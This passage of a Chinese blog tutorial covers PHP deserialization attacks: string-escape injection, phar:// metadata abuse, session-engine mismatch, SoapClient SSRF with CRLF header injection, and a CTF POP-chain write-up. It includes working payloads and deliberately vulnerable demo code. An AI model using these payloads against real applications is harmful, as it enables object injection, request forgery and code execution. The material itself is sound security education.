+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210012901305.png" alt="image-20221210012901305"></p>
+<p>我们发现并没有什么改变，说明{}是字符串反序列化时的分界符，在进行反序列化时，是从左到右读取。读取多少取决于s后面的字符长度</p>
+<p>比如当我们将数字改成5</p>
+<pre><code class="php">O:6:&quot;sakura&quot;:2:&#123;s:5:&quot;name&quot;;s:2:&quot;HY&quot;;s:3:&quot;age&quot;;s:2:&quot;25&quot;;&#125;
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210013348276.png" alt="image-20221210013348276"></p>
+<p>此时在读取name时，它会将闭合的双引号也读取在内，而需要闭合字符串的双引号被当作字符串处理，这时就会导致语法错误而报错。</p>
+<p>一般触发字符逃逸的前提是这个替换函数str_replace，能将字符串的长度改变，其主要原理就是运用闭合的思想。</p>
+<p>字符逃逸主要有两种，一种是字符增多，一种是字符减少。</p>
+<p><strong>1.过滤后字符变多</strong></p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+header(&quot;Content-Type: text/html; charset=utf-8&quot;);
+
+class sakura&#123;
+    public $name;
+    public $age=&#39;25&#39;;
+    function __destruct()&#123;
+        print $this-&gt;age;
+    &#125;
+&#125;
+function change($str)&#123;
+    return str_replace(&quot;H&quot;,&quot;HH&quot;,$str);
+&#125;
+$a = new sakura();
+$a-&gt;name=$_GET[&#39;x&#39;];
+$str=serialize($a);
+print &quot;过滤前: &quot;.&quot;\n&quot;;
+print $str;
+print &quot;  逃逸前sakura的年龄为:  &quot;;
+unset($a);
+$str=change($str);
+print &quot;  过滤后:&quot;.&quot;\n&quot;;
+print $str.&quot;\n&quot;;
+print &quot;过滤后sakura的年龄为:&quot;;
+unserialize($str);
+</code></pre>
+<p>我们先随意传入一个名字</p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210014745476.png" alt="image-20221210014745476"></p>
+<p>如果我们传入带有H的名字会怎么样呢?</p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210014915564.png" alt="image-20221210014915564"></p>
+<p>我们可以发现名字由 HY变为了 HHY</p>
+<p>我们输入很多H呢?</p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210015149828.png" alt="image-20221210015149828"></p>
+<p>神奇的事情发生了,过滤后的序列化字符串名字长度仍然是9,但是实际上它的长度早已经超过9了,所以我们就可以利用这点来构造字符串逃逸</p>
+<p>我们首先要想，我们需要把他构造成什么样的形式,我们的目的是要修改age的值，而我们的输入点在name处</p>
+<pre><code class="php">&quot;;s:3:&quot;age&quot;;s:2:&quot;99&quot;;&#125;
+</code></pre>
+<p>这些是我们需要传入的,但是我们还要计算下它有多长，然后选择合适的H的个数去逃逸它</p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210015919846.png" alt="image-20221210015919846"></p>
+<p>我们需要逃逸22个字符，每多一个H我们可以逃逸一个字符，所以我们需要22个H，由此我们可以传入</p>
+<pre><code class="php">HHHHHHHHHHHHHHHHHHHHHH&quot;;s:3:&quot;age&quot;;s:2:&quot;99&quot;;&#125;
+</code></pre>
+<p>我们来看看效果</p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210020543648.png" alt="image-20221210020543648"></p>
+<p>我们成功完成了字符串逃逸，改变了age的值！</p>
+<p><strong>2.过滤后字符变少</strong></p>
+<p>这个原理其实也差不多，我们直接上代码</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+header(&quot;Content-Type: text/html; charset=utf-8&quot;);
+
+class sakura&#123;
+    public $name;
+    public $age=&#39;25&#39;;
+    function __destruct()&#123;
+        print $this-&gt;age;
+    &#125;
+&#125;
+function change($str)&#123;
+    return str_replace(&quot;HH&quot;,&quot;H&quot;,$str);
+&#125;
+$a = new sakura();
+$a-&gt;name=$_GET[&#39;x&#39;];
+$str=serialize($a);
+print &quot;过滤前: &quot;.&quot;\n&quot;;
+print $str;
+print &quot;  逃逸前sakura的年龄为:  &quot;;
+unset($a);
+$str=change($str);
+print &quot;  过滤后:&quot;.&quot;\n&quot;;
+print $str.&quot;\n&quot;;
+print &quot;过滤后sakura的年龄为:&quot;;
+unserialize($str);
+</code></pre>
+<p>也就是每输入两个HH就会变为一个H</p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210020923726.png" alt="image-20221210020923726"></p>
+<p>但是原理是有所不同的，字符增加主要是使s包含的范围被我们的垃圾字符填充，然后会继续反序列化我们恶意的字符串,由于它本来带的那部分序列化内容被我们用}截断，所以并没有起效果</p>
+<p>而这个字符串减少的字符串逃逸，我们可以发现，s的范围是大于我们的名字的，所以我们需要让s的范围包含完本来的字符串，这样我们的恶意字符串就得以执行</p>
+<p>为了更好的理解题目，我们稍微修改一下代码:</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+header(&quot;Content-Type: text/html; charset=utf-8&quot;);
+
+class sakura&#123;
+    public $name=&#39;HY&#39;;
+    public $age=&#39;25&#39;;
+    function __destruct()&#123;
+        print $this-&gt;age;
+    &#125;
+&#125;
+function change($str)&#123;
+    return str_replace(&quot;HH&quot;,&quot;H&quot;,$str);
+&#125;
+$a = new sakura();
+$str = serialize($a);
+echo $str;
+echo &quot;\n&quot;;
+print &quot;改变前sakura的年龄为:&quot;;
+unset($a);
+echo &quot;\n&quot;;
+$str = change($str);
+print $str;
+echo &quot;\n&quot;;
+print &quot;改变后sakura的年龄为:&quot;;
+unserialize($str);
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210165137214.png" alt="image-20221210165137214"></p>
+<pre><code class="php">O:6:&quot;sakura&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;HY&quot;;s:3:&quot;age&quot;;s:2:&quot;25&quot;;&#125;
+</code></pre>
+<p>我们尝试多给name一些H看会发生什么</p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210165216207.png" alt="image-20221210165216207"></p>
+<p>我们发现name的值的范围已经大于了HH，所以把<code>&quot;;</code>也包含进去了,所以我们是不是可以让它把原来的age部分全部包含，让php反序列化我们传入的恶意序列化值呢?</p>
+<p>我们构造的恶意payload为:</p>
+<pre><code class="php">25&quot;;s:3:&quot;age&quot;;s:2:&quot;99
+</code></pre>
+<p>我们需要让s包含的字符有:</p>
+<pre><code class="php">&quot;;s:3:&quot;age&quot;;s:21:&quot;25  //20个字符
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210170054095.png" alt="image-20221210170054095"></p>
+<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><p><strong>概要</strong></p>
+<p>来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数unserialize()的前提下，引起严重的php对象注入漏洞。<br> 这个新的攻击方式被他公开在了美国的BlackHat会议演讲上，演讲主题为：”不为人所知的php反序列化漏洞”。它可以使攻击者将相关漏洞的严重程度升级为远程代码执行。我们在RIPS代码分析引擎中添加了对这种新型攻击的检测。</p>
+<p><strong>关于流包装</strong></p>
+<p>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如<code>data://</code>，<code>zlib://</code>或<code>php://</code>。<br> 例如常见的</p>
+<pre><code class="php">include(&#39;php://filter/read=convert.base64-encode/resource=index.php&#39;);
+include(&#39;data://text/plain;base64,xxxxxxxxxxxx&#39;);
+</code></pre>
+<p><code>phar://</code>也是流包装的一种</p>
+<p><strong>漏洞成因</strong></p>
+<p>phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作</p>
+<p><strong>原理分析</strong></p>
+<p>phar由四个部分组成，分别是stub、manifest describing the   contents、 the file contents、 [optional] a signature for verifying Phar   integrity (phar file format only)</p>
+<p>stub:标识作用，格式为xxx，前面任意，但是一定要以__HALT_COMPILER();?&gt;结尾，否则php无法识别这是一个phar文件；</p>
+<p>manifest describing the contents:其实可以理解为phar文件本质上是一种压缩文件，其中包含有压缩信息和权限，当然我们需要利用的序列化也在里面；</p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221211172536017.png" alt="image-20221211172536017"></p>
+<p> the file contents:这里指的是被压缩文件的内容；</p>
+<p>[optional] a signature for verifying Phar integrity (phar file format only):签名，放在结尾；</p>
+<p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作</p>
+<p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p>
+<pre><code class="php">&lt;?php
+
+class TestObject &#123;
+
+&#125;
+
+@unlink(&quot;phar.phar&quot;);
+
+$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar
+
+$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作
+
+$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+
+$o = new TestObject();
+
+$o -&gt; data=&#39;sakura&#39;;
+
+$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+
+//签名自动计算
+
+$phar-&gt;stopBuffering();
+
+?&gt;
+</code></pre>
+<p>访问一下，发现同目录下生成了一个.phar后缀的文件(如果这步无法创建，请修改php.ini的配置，设置phar.readonly = off 并去掉前面的分号)</p>
+<p><a href="https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027213811961.png"><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20211027213811961.png" alt="image-20211027213811961"></a></p>
+<p>打开：</p>
+<p><a href="https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027215216183.png"><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20211027215216183.png" alt="image-20211027215216183"></a></p>
+<p>发现写入的内容已经被序列化。</p>
+<p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221211172631232.png" alt="image-20221211172631232"></p>
+<p>当然不止上面这些</p>
+<pre><code class="php">可参考链接:https://blog.zsxsoft.com/post/38
+
+//exif
+exif_thumbnail
+exif_imagetype
+    
+//gd
+imageloadfont
+imagecreatefrom***系列函数
+    
+//hash
+    
+hash_hmac_file
+hash_file
+hash_update_file
+md5_file
+sha1_file
+    
+// file/url
+get_meta_tags
+get_headers
+    
+//standard 
+getimagesize
+getimagesizefromstring
+    
+// zip   
+$zip = new ZipArchive();
+$res = $zip-&gt;open(&#39;c.zip&#39;);
+$zip-&gt;extractTo(&#39;phar://test.phar/test&#39;);
+// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过
+$z = &#39;compress.bzip2://phar:///home/sx/test.phar/test.txt&#39;;
+$z = &#39;compress.zlib://phar:///home/sx/test.phar/test.txt&#39;;
+
+//配合其他协议：(SUCTF)
+//https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/
+//当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。
+//php://filter/read=convert.base64-encode/resource=phar://phar.phar
+
+//Postgres pgsqlCopyToFile和pg_trace同样也是能使用的，需要开启phar的写功能。
+&lt;?php
+    $pdo = new PDO(sprintf(&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;, &quot;127.0.0.1&quot;, &quot;postgres&quot;, &quot;sx&quot;, &quot;123456&quot;));
+    @$pdo-&gt;pgsqlCopyFromFile(&#39;aa&#39;, &#39;phar://phar.phar/aa&#39;);
+?&gt;
+    
+// Mysql
+//LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper
+//配置一下mysqld:
+//[mysqld]
+//local-infile=1
+//secure_file_priv=&quot;&quot;
+    
+&lt;?php
+class A &#123;
+    public $s = &#39;&#39;;
+    public function __wakeup () &#123;
+        system($this-&gt;s);
+    &#125;
+&#125;
+$m = mysqli_init();
+mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
+$s = mysqli_real_connect($m, &#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;, &#39;testtable&#39;, 3306);
+$p = mysqli_query($m, &#39;LOAD DATA LOCAL INFILE \&#39;phar://test.phar/test\&#39; INTO TABLE a  LINES TERMINATED BY \&#39;\r\n\&#39;  IGNORE 1 LINES;&#39;);
+?&gt;
+</code></pre>
+<p><strong>漏洞利用</strong></p>
+<p>phar_fan.php</p>
+<pre><code>&lt;?php
+class TestObject&#123;
+    function __destruct()
+    &#123;
+        echo $this -&gt; data;   // TODO: Implement __destruct() method.
+    &#125;
+&#125;
+include(&#39;phar://phar.phar&#39;);
+?&gt;
+</code></pre>
+<p><a href="https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027215532641.png"><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20211027215532641.png" alt="image-20211027215532641"></a></p>
+<p>我们来简要说明下整个调用流程：</p>
+<p>访问 phar_fun.php这个文件</p>
+<p>执行incleude代码</p>
+<p>解析phar文件</p>
+<p>将里面的meta-data反序列化，在上述代码中也就是TestObject这个对象。</p>
+<p>对象销毁，调用魔术方法__destruct()</p>
+<p>执行echo语句完成攻击。</p>
+<p><strong>将phar伪造成其他格式的文件</strong></p>
+<p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
+<pre><code class="php">&lt;?php
+    class TestObject &#123;
+    &#125;
+
+    @unlink(&quot;sakura.phar&quot;);
+    $phar = new Phar(&quot;sakura.phar&quot;);
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头
+    $o = new TestObject();
+    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+    //签名自动计算
+    $phar-&gt;stopBuffering();
+?&gt;
+</code></pre>
+<p>然后调用phar://sakura.php</p>
+<p>是一样的效果。</p>
+<p><strong>漏洞的利用条件</strong></p>
+<ol>
+<li>phar文件要能够上传到服务器端。</li>
+<li>要有可用的魔术方法作为“跳板”。</li>
+<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
+</ol>
+<h1 id="php-session反序列化"><a href="#php-session反序列化" class="headerlink" title="php session反序列化"></a>php session反序列化</h1><p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储的方式就是由配置项session_save_handler来进行确定的，默认是以文件的方式存储。<br>存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容</p>
+<p>在php.ini中存在三项配置项：</p>
+<pre><code class="php">session.save_path=&quot;&quot;   --设置session的存储路径
+session.save_handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
+session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认是php(5.5.4后改为php_serialize)
+</code></pre>
+<p>session.serialize_handler存在以下几种</p>
+<pre><code class="php">php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值
+php 键名+竖线（|）+经过serialize()函数处理过的值
+php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化
+</code></pre>
+<p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);。<br>php_binary引擎格式</p>
+<pre><code class="php">&lt;0x04&gt;names:5:&quot;Smi1e&quot;;
+</code></pre>
+<p>php引擎格式</p>
+<pre><code class="php">name|s:5:&quot;Smi1e&quot;;
+</code></pre>
+<p>php_searialize引擎格式</p>
+<pre><code class="php">a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;Smi1e&quot;;&#125;
+</code></pre>
+<p>当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞。<br>例如传入</p>
+<pre><code class="php">$_SESSION[&#39;name&#39;]=&#39;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&#39;;
+</code></pre>
+<p>序列化引擎使用的是php_serialize，那么储存的session文件为</p>
+<pre><code class="php">a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&quot;;&#125;
+</code></pre>
+<p>而反序列化引擎如果使用的是php，就会把|作为作为key和value的分隔符。把a:1:{s:4:“name”;s:5:”当作键名，而把O:5:“Smi1e”:1:{s:4:“test”;s:3:“AAA”;}当作经过serialize()函数处理过的值，最后会把它进行unserialize处理，此时就构成了一次反序列化注入攻击。</p>
+<h1 id="PHP原生类SoapClient反序列化利用"><a href="#PHP原生类SoapClient反序列化利用" class="headerlink" title="PHP原生类SoapClient反序列化利用"></a>PHP原生类SoapClient反序列化利用</h1><p> soapClient：专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。<br>类介绍：  </p>
+<pre><code class="php">SoapClient &#123;
+    /* 方法 */
+    public __construct ( string|null $wsdl , array $options = [] )
+    public __call ( string $name , array $args ) : mixed
+    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
+    public __getCookies ( ) : array
+    public __getFunctions ( ) : array|null
+    public __getLastRequest ( ) : string|null
+    public __getLastRequestHeaders ( ) : string|null
+    public __getLastResponse ( ) : string|null
+    public __getLastResponseHeaders ( ) : string|null
+    public __getTypes ( ) : array|null
+    public __setCookie ( string $name , string|null $value = null ) : void
+    public __setLocation ( string $location = &quot;&quot; ) : string|null
+    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
+    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed&#125;
+</code></pre>
+<p> 存在_ _call方法，当__call方法被触发，可以发送HTTP和HTTPS请求。使得 SoapClient 类可以被我们运用在 SSRF 中。而__call触发很简单，就是当对象访问不存在的方法的时候就会触发。  </p>
+<pre><code class="php">函数形式：
+    public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
+第一个参数为指明是否为wsdl模式，为null则为非wsdl模式
+wsdl，就是一个xml格式的文档，用于描述Web Server的定义
+第二个参数为array，wsdl模式下可选；非wsdl模式下，需要设置location和uri，location就是发送SOAP服务器的URL，uri是服务的命名空间
+</code></pre>
+<p> 首先测试下正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法  </p>
+<pre><code class="php">&lt;?php
+$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&#39;bbb&#39;, &#39;location&#39;=&gt;&#39;http://108.166.201.16:5555/path&#39;));
+$b = serialize($a);
+echo $b;
+$c = unserialize($b);
+$c-&gt;not_exists_function();
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665298510417-609387c8-6763-4ca9-922c-69419dae6f1d.png" alt="img"></p>
+<p><strong>CRLF</strong></p>
+<p> 从上图可以看到，SOAPAction处可控，可以把\x0d\x0a注入到SOAPAction，POST请求的header就可以被控制  </p>
+<pre><code class="php">&lt;?php
+$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&quot;bbb\r\n\r\nccc\r\n&quot;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;));
+$b = serialize($a);
+echo $b;
+$c = unserialize($b);
+$c-&gt;not_exists_function();
+</code></pre>
+<p>第一个参数是用来指明是否是 wsdl 模式。</p>
+<p>第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。具体可以设置的参数可见官方文档</p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665299010016-b134387a-88ae-4b19-9b14-e495c2acd225.png" alt="img"></p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665299033504-8234fdf2-329e-4b4c-ac0b-3512136fc295.png" alt="img"></p>
+<p>但Content-Type在SOAPAction的上面，就无法控制Content-Typ,也就不能控制POST的数据</p>
+<p>在header里User-Agent在Content-Type前面</p>
+<pre><code class="php">https://www.php.net/manual/zh/soapclient.soapclient.php :
+The user_agent option specifies string to use in User-Agent header.
+</code></pre>
+<p>user_agent同样可以注入CRLF，控制Content-Type的值</p>
+<pre><code class="php">&lt;?php
+$target = &#39;http://127.0.0.1:5555/path&#39;;
+$post_string = &#39;data=something&#39;;
+$headers = array(
+    &#39;X-Forwarded-For: 127.0.0.1&#39;,
+    &#39;Cookie: PHPSESSID=my_session&#39;
+    );
+$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));
+$aaa = serialize($b);
+$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);
+$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);
+echo $aaa;
+$c = unserialize($aaa);
+$c-&gt;not_exists_function();
+?&gt;
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665299220045-7fa39f85-3c66-4929-a97b-cf08e1d6a3a0.png" alt="img"></p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665299243252-81156156-b050-4637-bea8-54bd0d302863.png" alt="img"></p>
+<p>如上，使用SoapClient<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>+CRLF<strong>可以生成任意POST请求</strong>。</p>
+<h1 id="安洵杯2022-babyphp"><a href="#安洵杯2022-babyphp" class="headerlink" title="安洵杯2022  babyphp"></a>安洵杯2022  babyphp</h1><p>这题结合了pop链构造，php原生类使用，和php session反序列化的利用</p>
+<p>index.php</p>
+<pre><code class="php">&lt;?php
+header(&quot;Content-Type: text/html; charset=utf-8&quot;);
+class A
+&#123;
+    public $a;
+    public $b;
+
+    public function __wakeup()
+    &#123;
+        $this-&gt;a = &quot;babyhacker&quot;;
+        print (&quot;this is wakeup&quot;);
+        print ($this-&gt;a);
+    &#125;
+
+    public function __invoke()
+    &#123;
+        if (isset($this-&gt;a) &amp;&amp; $this-&gt;a == md5($this-&gt;a)) &#123;
+            print (&quot;this is invoke&quot;);
+            print ($this-&gt;a);
+            $this-&gt;b-&gt;uwant();
+        &#125;
+    &#125;
+&#125;
+
+class B
+&#123;
+    public $a;
+    public $b;
+    public $k;
+
+    function __destruct()
+    &#123;
+        $this-&gt;b = $this-&gt;k;
+        die($this-&gt;a);
+    &#125;
+&#125;
+
+class C&#123;
+    public $a;
+    public $c;
+
+    public function __toString()&#123;
+        $cc=$this-&gt;c;
+        return $cc();
+    &#125;
+    public function uwant()
+    &#123;
+        if($this-&gt;a==&quot;phpinfo&quot;)&#123;
+            phpinfo();
+        &#125;else&#123;
+            print (array(reset($_SESSION),$this-&gt;a));
+            call_user_func(array(reset($_SESSION),$this-&gt;a));
+        &#125;
+    &#125;
+&#125;
+
+
+
+if (isset($_GET[&#39;d0g3&#39;])) &#123;
+    ini_set($_GET[&#39;baby&#39;], $_GET[&#39;d0g3&#39;]);
+    session_start();
+    $_SESSION[&#39;sess&#39;] = $_POST[&#39;sess&#39;];
+&#125;
+else&#123;
+    session_start();
+    if (isset($_POST[&quot;pop&quot;])) &#123;
+        unserialize($_POST[&quot;pop&quot;]);
+    &#125;
+&#125;
+var_dump($_SESSION);
+highlight_file(__FILE__);
+</code></pre>
+<p>flag.php</p>
+<pre><code class="php">&lt;?php
+session_start();
+highlight_file(__FILE__);
+//flag在根目录下
+if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;
+        $f1ag=implode(array(new $_GET[&#39;a&#39;]($_GET[&#39;b&#39;])));
+    $_SESSION[&quot;F1AG&quot;]= $f1ag;
+&#125;else&#123;
+       echo &quot;only localhost!!&quot;;
+&#125;
+</code></pre>
+<h3 id="尝试获取phpinfo-构造pop链条"><a href="#尝试获取phpinfo-构造pop链条" class="headerlink" title="尝试获取phpinfo,构造pop链条"></a>尝试获取phpinfo,构造pop链条</h3><pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+header(&quot;Content-Type: text/html; charset=utf-8&quot;);
+class A
+&#123;
+    public $a;
+    public $b;
+
+    public function __wakeup()
+    &#123;
+        $this-&gt;a = &quot;babyhacker&quot;;
+        print (&quot;this is wakeup&quot;);
+        print ($this-&gt;a);
+    &#125;
+
+    public function __invoke()
+    &#123;
+        if (isset($this-&gt;a) &amp;&amp; $this-&gt;a == md5($this-&gt;a)) &#123;
+            print (&quot;this is invoke&quot;);
+            print ($this-&gt;a);
+            $this-&gt;b-&gt;uwant();
+        &#125;
+    &#125;
+&#125;
+
+class B
+&#123;
+    public $a;
+    public $b;
+    public $k;
+
+    function __destruct()
+    &#123;
+        $this-&gt;b = $this-&gt;k;
+        die($this-&gt;a);
+    &#125;
+&#125;
+
+class C&#123;
+    public $a;
+    public $c;
+
+    public function __toString()&#123;
+        $cc=$this-&gt;c;
+        return $cc();
+    &#125;
+    public function uwant()
+    &#123;
+        if($this-&gt;a==&quot;phpinfo&quot;)&#123;
+            phpinfo();
+        &#125;else&#123;
+            print (array(reset($_SESSION),$this-&gt;a));
+            call_user_func(array(reset($_SESSION),$this-&gt;a));
+        &#125;
+    &#125;
+&#125;
+
+
+$B = new B();
+$B-&gt;a=new C();
+$B-&gt;a-&gt;c=new A();
+$B-&gt;a-&gt;c-&gt;b=$B-&gt;a;
+$B-&gt;a-&gt;c-&gt;a=&quot;0e215962017&quot;;  \\双md5绕过
+$B-&gt;a-&gt;a=&quot;phpinfo&quot;;
+print (serialize($B));
+</code></pre>
+<p>生成如下payload:</p>
+<p>然后要绕过这个A类里的wakeup函数,使用fastdestruct,在末尾去点个}即可</p>
+<pre><code class="php">O:1:&quot;B&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;c&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:11:&quot;0e215962017&quot;;s:1:&quot;b&quot;;r:2;&#125;&#125;s:1:&quot;b&quot;;N;s:1:&quot;k&quot;;N;
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669572452999-4c7c0d9f-7e02-4554-b6fe-3cb50bd081e1.png" alt="img"></p>
+<h3 id="php-session反序列化-1"><a href="#php-session反序列化-1" class="headerlink" title="php session反序列化"></a>php session反序列化</h3><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669572514590-86d553ce-17ed-4ceb-9380-f387e618fb16.png" alt="img"></p>
+<p>php中的seiion中的内容并不是放在内存中的，而是以文件的方式来存储的，存储的方式就是由配置项session_save_handler来进行确定的，默认是以文件的方式存储。</p>
+<p>存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容</p>
